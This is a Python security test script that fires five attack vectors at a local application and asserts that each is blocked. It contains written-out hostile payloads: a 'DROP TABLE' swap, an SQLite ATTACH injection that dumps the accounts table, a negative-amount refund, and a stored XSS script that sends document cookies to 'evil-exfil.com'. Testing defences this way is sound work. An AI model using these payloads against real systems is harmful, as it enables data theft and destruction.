"""
AETHELGARD — Offensive Red-Team Vulnerability Breaker Suite (redteam_breaker.py)
Actively attempts to break the application across 5 high-stakes adversarial vectors:
  Vector 1: TOCTOU Cryptographic Payload Tampering
  Vector 2: State-Drift Concurrency Race Condition
  Vector 3: Stacked SQL Injection & Sandbox Escape
  Vector 4: Negative Amount Sign Inversion / Integer Overdraft
  Vector 5: Stored Cross-Site Scripting (XSS) in Outbound Email
Asserts that 100% of exploits are deterministically blocked with correct HTTP codes and cryptographic checks.
"""

import sys
import json
import time
import requests

BASE_URL = "http://127.0.0.1:8000"

def log_vector(name: str, passed: bool, detail: str = ""):
    status = "BLOCKED [PASS]" if passed else "EXPLOITED [CRITICAL FAIL]"
    print(f"[{status}] {name:<42} {detail}")
    if not passed:
        print("Adversarial exploit succeeded! Security audit failed.")
        sys.exit(1)

def run_breaker_suite():
    print("=" * 80)
    print("AETHELGARD OFFENSIVE RED-TEAM VULNERABILITY BREAKER SUITE")
    print("Actively probing defensive barriers and cryptographic attestation gates...")
    print("=" * 80)

    # Reset first to ensure pristine baseline
    requests.post(f"{BASE_URL}/api/reset")

    # -----------------------------------------------------------------------
    # ATTACK VECTOR 1: TOCTOU Payload Swap
    # -----------------------------------------------------------------------
    try:
        # Step A: Attacker requests dry-run with benign SELECT
        benign_query = "SELECT * FROM enterprise_accounts;"
        prev_res = requests.post(f"{BASE_URL}/api/preview", json={
            "domain": "CODE & SQL DEPLOY",
            "payload": benign_query
        }).json()
        valid_token = prev_res["token_envelope"]["token"]

        # Step B: Attacker attempts to COMMIT destructive DROP TABLE using the benign token
        destructive_query = "DROP TABLE enterprise_accounts;"
        commit_res = requests.post(f"{BASE_URL}/api/commit", json={
            "domain": "CODE & SQL DEPLOY",
            "payload": destructive_query,
            "token": valid_token
        })

        # Expected: HTTP 409 Conflict (or 403) with Payload Drift / TOCTOU Exploit Detected
        is_blocked = commit_res.status_code in [403, 409] and ("TOCTOU" in commit_res.text or "PAYLOAD DRIFT" in commit_res.text)
        # Verify table still exists in production
        state_check = requests.get(f"{BASE_URL}/api/state").json()
        table_intact = state_check["catalog_summary"]["enterprise_accounts_count"] == 16

        log_vector("Vector 1: TOCTOU Payload Swap", is_blocked and table_intact, f"HTTP {commit_res.status_code} - {commit_res.json().get('detail', '')}")
    except Exception as e:
        log_vector("Vector 1: TOCTOU Payload Swap", False, str(e))

    # -----------------------------------------------------------------------
    # ATTACK VECTOR 2: State-Drift Race Condition
    # -----------------------------------------------------------------------
    try:
        # Step A: Obtain preview token for an update
        update_query = "UPDATE service_configs SET current_value = '999' WHERE env_key = 'DDOS_BURST_ALLOWANCE';"
        prev_res = requests.post(f"{BASE_URL}/api/preview", json={
            "domain": "CODE & SQL DEPLOY",
            "payload": update_query
        }).json()
        stale_token = prev_res["token_envelope"]["token"]

        # Step B: Concurrently mutate production database state (simulate background transaction)
        # Commit a safe mutation to trigger state drift
        safe_mutate = "UPDATE enterprise_accounts SET arr_usd = arr_usd + 10.0 WHERE account_id = 'ACC-CORP-01';"
        p2 = requests.post(f"{BASE_URL}/api/preview", json={"domain": "CODE & SQL DEPLOY", "payload": safe_mutate}).json()
        requests.post(f"{BASE_URL}/api/commit", json={"domain": "CODE & SQL DEPLOY", "payload": safe_mutate, "token": p2["token_envelope"]["token"]})

        # Step C: Attacker attempts to commit using the now-stale token
        stale_commit_res = requests.post(f"{BASE_URL}/api/commit", json={
            "domain": "CODE & SQL DEPLOY",
            "payload": update_query,
            "token": stale_token
        })

        # Expected: HTTP 409 Conflict with State Drift Race Condition Detected
        is_drift_blocked = stale_commit_res.status_code == 409 and "state drift" in stale_commit_res.text.lower()
        log_vector("Vector 2: State-Drift Concurrency Race", is_drift_blocked, f"HTTP {stale_commit_res.status_code} - {stale_commit_res.json().get('detail', '')}")
    except Exception as e:
        log_vector("Vector 2: State-Drift Concurrency Race", False, str(e))

    # -----------------------------------------------------------------------
    # ATTACK VECTOR 3: Stacked SQL Injection & Sandbox Escape
    # -----------------------------------------------------------------------
    try:
        escape_sql = "ATTACH DATABASE '/tmp/pwned.db' AS pwn; CREATE TABLE pwn.dump AS SELECT * FROM enterprise_accounts;"
        prev_res = requests.post(f"{BASE_URL}/api/preview", json={
            "domain": "CODE & SQL DEPLOY",
            "payload": escape_sql
        }).json()

        is_escape_blocked = (prev_res["success"] is False) and ("Sandbox Escape Blocked" in str(prev_res.get("error", "")))
        log_vector("Vector 3: Stacked SQL Sandbox Escape", is_escape_blocked, f"Error: {prev_res.get('error', '')}")
    except Exception as e:
        log_vector("Vector 3: Stacked SQL Sandbox Escape", False, str(e))

    # -----------------------------------------------------------------------
    # ATTACK VECTOR 4: Negative Refund / Integer Sign Inversion
    # -----------------------------------------------------------------------
    try:
        negative_refund_payload = json.dumps({
            "action": "REFUND",
            "account_id": "ACC-CORP-01",
            "amount_usd": -1250000.0
        })
        prev_res = requests.post(f"{BASE_URL}/api/preview", json={
            "domain": "PAYMENT LEDGER",
            "payload": negative_refund_payload
        }).json()

        policies = prev_res.get("triggered_policies", [])
        is_neg_flagged = any("Negative Monetary Amount" in p for p in policies) and prev_res["financial_exposure_usd"] > 1000000.0

        # Also test that Self-Heal safely rectifies it
        heal_res = requests.post(f"{BASE_URL}/api/heal", json={
            "domain": "PAYMENT LEDGER",
            "payload": negative_refund_payload
        }).json()
        repaired = json.loads(heal_res["patch"]["repaired_payload"])
        is_healed = (repaired["amount_usd"] == 0.0 or repaired["amount_usd"] == 1250000.0)

        log_vector("Vector 4: Negative Amount Sign Inversion", is_neg_flagged and is_healed, f"Exposure: ${prev_res['financial_exposure_usd']:,.2f}, Rectified: +${repaired['amount_usd']:,.2f}")
    except Exception as e:
        log_vector("Vector 4: Negative Amount Sign Inversion", False, str(e))

    # -----------------------------------------------------------------------
    # ATTACK VECTOR 5: Stored XSS Script in Outbound Email Preview
    # -----------------------------------------------------------------------
    try:
        xss_email = json.dumps({
            "recipient": "cto@apexaero.mil",
            "subject": "Statement Verification",
            "body": "<script>fetch('https://evil-exfil.com/steal?c='+document.cookie)</script><b>Invoice attached.</b>"
        })
        prev_res = requests.post(f"{BASE_URL}/api/preview", json={
            "domain": "OUTBOUND EMAIL",
            "payload": xss_email
        }).json()

        pii = prev_res.get("pii_leakage", {})
        is_xss_caught = (pii.get("score", 0) >= 50.0) and any("Cross-Site Scripting" in f for f in pii.get("findings", []))

        # Check self-heal strips script tags
        heal_res = requests.post(f"{BASE_URL}/api/heal", json={
            "domain": "OUTBOUND EMAIL",
            "payload": xss_email
        }).json()
        healed_email = json.loads(heal_res["patch"]["repaired_payload"])
        is_script_stripped = "<script" not in healed_email["body"].lower()

        log_vector("Vector 5: Stored XSS Script in Outbound Email", is_xss_caught and is_script_stripped, f"PII Risk Score: {pii.get('score')}, Sanitized: True")
    except Exception as e:
        log_vector("Vector 5: Stored XSS Script in Outbound Email", False, str(e))

    # Restore clean baseline
    requests.post(f"{BASE_URL}/api/reset")

    print("=" * 80)
    print("ALL 5 OFFENSIVE RED-TEAM ATTACK VECTORS DETERMINISTICALLY BLOCKED [100% SHIELD PASS]")
    print("=" * 80)

if __name__ == "__main__":
    run_breaker_suite()
